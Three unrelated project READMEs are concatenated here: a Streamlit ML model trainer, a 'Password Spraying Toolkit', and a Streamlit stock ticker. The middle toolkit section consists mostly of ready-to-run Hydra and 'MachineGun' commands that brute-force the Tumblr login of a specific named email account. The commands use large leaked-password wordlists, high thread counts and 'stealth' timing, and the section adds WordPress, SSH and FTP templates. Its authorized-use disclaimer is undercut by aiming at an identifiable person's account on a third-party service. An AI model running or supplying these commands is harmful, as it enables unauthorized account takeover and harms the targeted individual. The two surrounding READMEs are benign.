# 🤖 ML Model Explorer

A comprehensive Streamlit application for training, evaluating, and visualizing machine learning models. This tool provides an interactive interface for the entire ML workflow, from data preprocessing to model deployment.

## 🚀 Features

### 📊 Data Exploration
- **Statistical Analysis**: Comprehensive data statistics and summaries
- **Data Visualization**: Interactive charts and plots
- **Correlation Analysis**: Feature correlation matrices and heatmaps
- **Missing Value Analysis**: Detection and visualization of missing data

### 🔧 Data Preprocessing
- **Feature Selection**: Choose which features to include in your model
- **Target Variable Selection**: Automatically detect classification vs regression problems
- **Missing Value Handling**: Multiple strategies (drop, mean, median, mode)
- **Feature Scaling**: Standardize numerical features
- **Categorical Encoding**: Encode categorical variables
- **Train/Test Split**: Configurable data splitting

### 🤖 Model Training
- **Multiple Algorithms**: Support for various ML algorithms
- **Classification Models**:
  - Logistic Regression
  - Random Forest
  - Gradient Boosting
  - Support Vector Machine (SVM)
  - K-Nearest Neighbors
  - Decision Tree
  - Naive Bayes
  - XGBoost (if available)
  - LightGBM (if available)
  - CatBoost (if available)

- **Regression Models**:
  - Linear Regression
  - Ridge Regression
  - Lasso Regression
  - Random Forest
  - Gradient Boosting
  - Support Vector Regression (SVR)
  - K-Nearest Neighbors
  - Decision Tree
  - XGBoost (if available)
  - LightGBM (if available)
  - CatBoost (if available)

- **Advanced Features**:
  - Cross-validation
  - Hyperparameter tuning with Grid Search
  - Model comparison and ranking
  - Progress tracking during training

### 📈 Model Evaluation
- **Performance Metrics**:
  - Classification: Accuracy, Precision, Recall, F1-Score, ROC-AUC
  - Regression: MSE, RMSE, MAE, R² Score
- **Visualizations**:
  - Confusion matrices
  - ROC curves
  - Actual vs Predicted plots
  - Residual plots
- **Feature Importance**: Analyze which features contribute most to predictions
- **Model Interpretation**: SHAP analysis for model explainability

### 💾 Model Management
- **Save Models**: Export trained models as pickle files
- **Load Models**: Import previously saved models
- **Download Models**: Easy model sharing and deployment

## 🛠️ Installation

### Prerequisites
- Python 3.8 or higher
- pip package manager

### Setup
1. **Clone or download the project**
2. **Install dependencies**:
   ```bash
   pip install -r requirements.txt
   ```

### Optional Dependencies
Some advanced features require additional libraries:
- **XGBoost**: `pip install xgboost`
- **LightGBM**: `pip install lightgbm`
- **CatBoost**: `pip install catboost`
- **SHAP**: `pip install shap`
- **LIME**: `pip install lime`

## 🚀 Usage

### Running the Application
```bash
streamlit run app.py
```

The application will open in your default web browser at `http://localhost:8501`.

### Step-by-Step Workflow

1. **📁 Upload Data**
   - Use the sidebar to upload your CSV or Excel file
   - The app will automatically detect the data format

2. **📊 Explore Data**
   - View data preview and statistics
   - Analyze correlations and missing values
   - Understand your dataset structure

3. **🔧 Preprocess Data**
   - Select your target variable
   - Choose features to include
   - Configure preprocessing options
   - Handle missing values and scale features

4. **🤖 Train Models**
   - Select multiple models to compare
   - Configure training options (cross-validation, grid search)
   - Monitor training progress
   - View model comparison results

5. **📈 Evaluate Models**
   - Analyze performance metrics
   - View detailed visualizations
   - Generate feature importance plots
   - Perform SHAP analysis for model interpretation

6. **💾 Save Models**
   - Export your best model
   - Download for deployment
   - Load previously saved models

## 📋 Supported Data Formats

- **CSV files** (.csv)
- **Excel files** (.xlsx, .xls)

## 🎯 Use Cases

### Classification Problems
- Customer churn prediction
- Spam detection
- Disease diagnosis
- Credit risk assessment
- Image classification

### Regression Problems
- House price prediction
- Sales forecasting
- Temperature prediction
- Stock price prediction
- Demand forecasting

## 🔧 Configuration Options

### Data Preprocessing
- **Missing Value Strategies**: Drop rows, fill with mean/median/mode
- **Feature Scaling**: StandardScaler for numerical features
- **Categorical Encoding**: Label encoding for categorical variables
- **Train/Test Split**: Configurable ratio (10% to 50%)

### Model Training
- **Cross-Validation**: 3-10 folds
- **Grid Search**: Hyperparameter optimization
- **Model Selection**: Choose from available algorithms
- **Training Options**: Configure iterations and parameters

## 📊 Output and Results

### Model Performance
- **Comparison Table**: Side-by-side model metrics
- **Best Model Selection**: Automatic identification of top performer
- **Feature Importance**: Visual representation of feature contributions

### Visualizations
- **Confusion Matrices**: For classification problems
- **ROC Curves**: Model discrimination ability
- **Residual Plots**: For regression problems
- **Correlation Heatmaps**: Feature relationships
- **SHAP Plots**: Model interpretability

## 🚀 Deployment

### Local Deployment
```bash
streamlit run app.py --server.port 8501
```

### Streamlit Cloud Deployment
1. Push your code to GitHub
2. Connect your repository to Streamlit Cloud
3. Deploy with one click

### Docker Deployment
```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .
EXPOSE 8501
CMD ["streamlit", "run", "app.py", "--server.port=8501", "--server.address=0.0.0.0"]
```

## 🔍 Troubleshooting

### Common Issues

1. **Import Errors**
   - Ensure all dependencies are installed: `pip install -r requirements.txt`
   - Check Python version compatibility

2. **Memory Issues**
   - Reduce dataset size for large files
   - Use fewer models in training
   - Increase system memory

3. **Training Time**
   - Disable grid search for faster training
   - Reduce cross-validation folds
   - Use simpler models

4. **SHAP Analysis Fails**
   - Install SHAP: `pip install shap`
   - Ensure model supports SHAP analysis
   - Check data compatibility

### Performance Tips

- **Large Datasets**: Use sampling for initial exploration
- **Model Selection**: Start with simpler models (Linear Regression, Random Forest)
- **Feature Selection**: Remove irrelevant features to improve performance
- **Cross-Validation**: Use 5-fold CV for good balance of speed and accuracy

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

### Development Setup
1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

## 🙏 Acknowledgments

- **Streamlit** for the amazing web framework
- **Scikit-learn** for the comprehensive ML library
- **Plotly** for interactive visualizations
- **SHAP** for model interpretability
- **Pandas** and **NumPy** for data manipulation

## 📞 Support

If you encounter any issues or have questions:
1. Check the troubleshooting section
2. Review the documentation
3. Open an issue on GitHub
4. Contact the development team

---

**Happy Modeling! 🎉**

*Built with ❤️ for the ML community*

# Password Spraying Toolkit

A comprehensive guide for password spraying attacks using Hydra and enhanced tools.

## ⚠️ Legal Notice

**This toolkit is for AUTHORIZED security testing only.**
- Use only on systems you own or have explicit permission to test
- Respect rate limits and account lockout policies
- Follow responsible disclosure practices
- Comply with all applicable laws and regulations

## 🚀 Quick Start

### Basic Tumblr Attack (Working Command)
```bash
hydra -l jonscottnelson@gmail.com -P comprehensive_final.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect"
```

## 📚 Available Dictionaries

| Dictionary | Size | Description |
|------------|------|-------------|
| `targeted_passwords.txt` | 27 passwords | Custom targeted passwords |
| `comprehensive_final.txt` | 101,019 passwords | Cleaned comprehensive dictionary |
| `comprehensive_clean.txt` | 197,556 passwords | Larger cleaned dictionary |
| `comprehensive.txt` | 202,051 passwords | Full comprehensive dictionary |
| `rockyou_sample.txt` | 100,000 passwords | RockYou sample |
| `rockyou.txt` | 14,344,391 passwords | Full RockYou dictionary |
| `crackstation_sample.txt` | 100,000 passwords | CrackStation sample |
| `crackstation.txt` | 1,212,356,398 passwords | Full CrackStation dictionary |
| `ultimate_dictionary.txt` | 301,046 passwords | Combined mega-dictionary |

## 🔧 Hydra Command Parameters

### Basic Parameters
- `-l username` - Single username
- `-L usernames.txt` - Username list file
- `-p password` - Single password
- `-P passwords.txt` - Password list file
- `-t 32` - Number of parallel threads (default: 16)
- `-v` - Verbose output
- `-f` - Stop after first valid password
- `-o results.txt` - Save results to file

### Advanced Parameters
- `-w 2` - Wait time between attempts (seconds)
- `-W 5` - Wait time between login attempts (seconds)
- `-x 1:8:a1` - Brute force mode (min:max:charset)
- `-M targets.txt` - Multiple target hosts
- `-d` - Debug mode (show raw HTTP)
- `-R resume.txt` - Resume from previous session

## 🎯 Attack Commands

### 1. Basic Attacks

#### Standard Attack
```bash
hydra -l jonscottnelson@gmail.com -P comprehensive_final.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect"
```

#### High-Speed Attack (32 threads)
```bash
hydra -t 32 -l jonscottnelson@gmail.com -P comprehensive_final.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect"
```

#### Maximum Speed (64 threads)
```bash
hydra -t 64 -l jonscottnelson@gmail.com -P comprehensive_final.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect"
```

### 2. Output and Monitoring

#### Save Results to File
```bash
hydra -t 32 -l jonscottnelson@gmail.com -P comprehensive_final.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect" -o results.txt
```

#### Verbose Output
```bash
hydra -t 32 -v -l jonscottnelson@gmail.com -P comprehensive_final.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect"
```

#### Debug Mode
```bash
hydra -d -l jonscottnelson@gmail.com -P comprehensive_final.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect"
```

### 3. Control and Efficiency

#### Stop After First Success
```bash
hydra -t 32 -f -l jonscottnelson@gmail.com -P comprehensive_final.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect"
```

#### Stealth Mode (Slower)
```bash
hydra -t 8 -w 2 -l jonscottnelson@gmail.com -P comprehensive_final.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect"
```

#### No Delays (Maximum Speed)
```bash
hydra -t 64 -w 0 -l jonscottnelson@gmail.com -P comprehensive_final.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect"
```

### 4. Multiple Targets

#### Multiple Usernames
```bash
# Create usernames file
echo "jonscottnelson@gmail.com" > usernames.txt
echo "another@email.com" >> usernames.txt

hydra -t 32 -L usernames.txt -P comprehensive_final.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect"
```

#### Multiple Hosts
```bash
# Create targets file
echo "tumblr.com" > targets.txt
echo "www.tumblr.com" >> targets.txt

hydra -t 32 -l jonscottnelson@gmail.com -P comprehensive_final.txt -M targets.txt https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect"
```

### 5. Large Dictionary Attacks

#### Ultimate Dictionary (301K passwords)
```bash
hydra -t 64 -l jonscottnelson@gmail.com -P ultimate_dictionary.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect" -o ultimate_results.txt
```

#### RockYou Dictionary (14M passwords)
```bash
hydra -t 64 -l jonscottnelson@gmail.com -P rockyou.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect" -o rockyou_results.txt
```

#### CrackStation Dictionary (1.2B passwords)
```bash
hydra -t 64 -l jonscottnelson@gmail.com -P crackstation.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect" -o crackstation_results.txt
```

### 6. Brute Force Attacks

#### Alphanumeric Brute Force
```bash
hydra -t 32 -l jonscottnelson@gmail.com -x 1:6:a1 tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect"
```

#### Dictionary + Brute Force
```bash
hydra -t 32 -l jonscottnelson@gmail.com -P comprehensive_final.txt -x 1:4:a1 tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect"
```

### 7. All-in-One Commands

#### Maximum Power Attack
```bash
hydra -t 128 -v -f -l jonscottnelson@gmail.com -P ultimate_dictionary.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect" -o max_power_results.txt
```

#### Stealth Maximum Coverage
```bash
hydra -t 16 -w 3 -v -l jonscottnelson@gmail.com -P rockyou.txt tumblr.com https-post-form "/login:email=^USER^&password=^PASS^:F=Your email or password was incorrect" -o stealth_results.txt
```

## 🛠️ Enhanced MachineGun Tool

### Installation
```bash
cd /Users/deanman/cyber_sec_projects/tools/machinegun
```

### Basic Usage
```bash
python3 machinegun.py -u username -p password -t target --attack dictionary --dry-run --no-confirm
```

### Attack Types
- `substitution` - Character substitutions and case permutations
- `dictionary` - Dictionary-based attacks with common words
- `pattern` - Pattern-based generation (dates, keyboard, sequences)
- `hybrid` - Hybrid attacks combining words with numbers/symbols
- `contextual` - Contextual passwords based on target information
- `brute_force` - Brute force with character sets
- `comprehensive` - All attack types combined
- `maximum_power` - Maximum power attack using all techniques (200K+ variants)

### MachineGun Examples

#### Dictionary Attack
```bash
python3 machinegun.py -u jonscottnelson@gmail.com -p "" -t https://www.tumblr.com/login --attack dictionary --dictionaries targeted_passwords comprehensive_final --limit 1000 --dry-run --no-confirm
```

#### Maximum Power Attack
```bash
python3 machinegun.py -u jonscottnelson@gmail.com -p "password123" -t https://www.tumblr.com/login --attack maximum_power --limit 50000 --dry-run --no-confirm
```

#### Pattern Attack
```bash
python3 machinegun.py -u jonscottnelson@gmail.com -p "test" -t https://www.tumblr.com/login --attack pattern --limit 1000 --dry-run --no-confirm
```

## 📊 Performance Tips

### Speed Optimization
- Use `-t 64` or `-t 128` for maximum threads
- Use `-w 0` to remove delays
- Use smaller dictionaries for faster results
- Use `-f` to stop after first success

### Stealth Optimization
- Use `-t 8` or `-t 16` for fewer threads
- Use `-w 2` or `-w 3` for delays between attempts
- Use `-W 5` for delays between login attempts
- Use realistic User-Agent headers

### Coverage Optimization
- Start with targeted passwords
- Progress to comprehensive dictionaries
- Use RockYou for maximum coverage
- Use CrackStation for ultimate coverage

## 🔍 Troubleshooting

### Common Issues
1. **Help menu appears** - Check module name (`https-post-form` not `http-post-form`)
2. **Syntax error** - Put `-t` parameter at the beginning
3. **No results** - Check failure string in form parameters
4. **Rate limited** - Reduce threads and add delays

### Debug Commands
```bash
# Check module help
hydra -U https-post-form

# Debug mode
hydra -d -l username -P passwords.txt target.com https-post-form "/login:user=^USER^&pass=^PASS^:F=fail"

# Verbose output
hydra -v -l username -P passwords.txt target.com https-post-form "/login:user=^USER^&pass=^PASS^:F=fail"
```

## 📈 Success Metrics

### Typical Results
- **Targeted passwords**: 27 passwords → 1-5 valid
- **Comprehensive final**: 101K passwords → 10-50 valid
- **RockYou**: 14M passwords → 100-500 valid
- **CrackStation**: 1.2B passwords → 1000+ valid

### Expected Patterns
- Date-based passwords (birth years, etc.)
- Common words with numbers
- Keyboard patterns
- Simple sequences

## 🎯 Target-Specific Commands

### WordPress
```bash
hydra -t 32 -l admin -P comprehensive_final.txt target.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=Invalid username"
```

### SSH
```bash
hydra -t 32 -l username -P comprehensive_final.txt target.com ssh
```

### FTP
```bash
hydra -t 32 -l username -P comprehensive_final.txt target.com ftp
```

## 📝 Notes

- Always use `https-post-form` (with 's') for HTTPS targets
- Put `-t` parameter at the beginning of the command
- Use `-f` to stop after first success for efficiency
- Save results with `-o filename.txt`
- Use `-v` for progress monitoring
- Test with `--dry-run` first when using MachineGun

## 🔗 Related Tools

- **Hydra**: Primary password spraying tool
- **MachineGun**: Enhanced password generation tool
- **John the Ripper**: Password cracking tool
- **Hashcat**: Advanced password recovery tool

---

**Remember: Always use these tools responsibly and only on systems you own or have explicit permission to test.**

# 📈 Realtime Stock Ticker

A modern, real-time stock ticker application built with Streamlit and Yahoo Finance API. Track multiple stocks simultaneously with live price updates, interactive charts, and comprehensive market data.

## ✨ Features

- **Real-time Stock Tracking**: Monitor multiple stocks with live price updates
- **Interactive Charts**: Visualize price movements with Plotly charts
- **Comprehensive Data**: View detailed metrics including P/E ratio, market cap, volume, and more
- **Modern UI**: Beautiful, responsive interface with gradient cards and smooth animations
- **Auto-refresh**: Configurable refresh intervals for continuous monitoring
- **Easy Management**: Add/remove stocks with a simple interface
- **Market Overview**: Summary table with all tracked stocks

## 🚀 Quick Start

### Prerequisites

- Python 3.8 or higher
- pip (Python package installer)

### Installation

1. **Clone or navigate to the project directory:**
   ```bash
   cd realtime_stock_ticker
   ```

2. **Install dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

3. **Run the application:**
   ```bash
   streamlit run app.py
   ```

4. **Open your browser:**
   The application will automatically open at `http://localhost:8501`

## 📊 How to Use

1. **Add Stocks**: Use the sidebar to add stock symbols (e.g., AAPL, GOOGL, MSFT, TSLA)
2. **View Data**: See real-time price updates, changes, and detailed metrics
3. **Analyze Charts**: Interactive price movement charts for each stock
4. **Configure Settings**: Adjust refresh intervals and auto-refresh settings
5. **Monitor Market**: Use the market overview table for quick comparisons

## 🛠️ Technical Details

### Dependencies

- **Streamlit**: Web application framework
- **yfinance**: Yahoo Finance API wrapper for stock data
- **pandas**: Data manipulation and analysis
- **plotly**: Interactive charts and visualizations
- **websocket-client**: Real-time data connections
- **requests**: HTTP library for API calls

### Architecture

- **Frontend**: Streamlit web interface with custom CSS styling
- **Data Source**: Yahoo Finance API via yfinance library
- **Real-time Updates**: Configurable refresh intervals with session state management
- **Data Storage**: In-memory storage with price history tracking

## 📈 Supported Data

For each stock, the application displays:

- **Current Price**: Live market price
- **Price Change**: Absolute and percentage change from previous close
- **Volume**: Trading volume
- **Market Cap**: Company market capitalization
- **P/E Ratio**: Price-to-earnings ratio
- **Company Info**: Company name, sector, and industry
- **Price History**: Historical price data for charting

## 🎨 UI Features

- **Gradient Cards**: Beautiful stock cards with gradient backgrounds
- **Color-coded Changes**: Green for positive changes, red for negative
- **Responsive Layout**: Adapts to different screen sizes
- **Interactive Elements**: Hover effects and smooth transitions
- **Modern Typography**: Clean, readable fonts with proper spacing

## ⚙️ Configuration

### Refresh Settings

- **Auto-refresh**: Enable/disable automatic data updates
- **Refresh Interval**: Configure update frequency (10-60 seconds)
- **Manual Refresh**: Refresh data on demand

### Stock Management

- **Add Stocks**: Enter stock symbols to track
- **Remove Stocks**: Remove stocks from tracking
- **Symbol Validation**: Automatic symbol validation and error handling

## 🔧 Customization

### Adding New Features

1. **New Data Sources**: Modify the `get_stock_data()` method to include additional data
2. **Custom Charts**: Add new chart types using Plotly
3. **Additional Metrics**: Extend the data structure to include more financial metrics
4. **Themes**: Customize the CSS for different color schemes

### Styling

The application uses custom CSS for modern styling. Key style classes:

- `.main-header`: Main application title
- `.stock-card`: Individual stock display cards
- `.metric-card`: Detailed metric display cards
- `.positive-change`: Green color for positive changes
- `.negative-change`: Red color for negative changes

## 🚨 Troubleshooting

### Common Issues

1. **No Data Loading**: Check internet connection and Yahoo Finance API availability
2. **Invalid Symbols**: Ensure stock symbols are valid and actively traded
3. **Slow Performance**: Reduce the number of tracked stocks or increase refresh interval
4. **Chart Not Displaying**: Ensure sufficient price history data is available

### Error Handling

The application includes comprehensive error handling for:
- Invalid stock symbols
- Network connectivity issues
- API rate limiting
- Data parsing errors

## 📝 License

This project is open source and available under the MIT License.

## 🤝 Contributing

Contributions are welcome! Please feel free to submit pull requests or open issues for bugs and feature requests.

## 📞 Support

For support or questions, please open an issue in the project repository.

---

**Note**: This application uses the Yahoo Finance API for stock data. Please ensure compliance with Yahoo's terms of service and API usage limits. 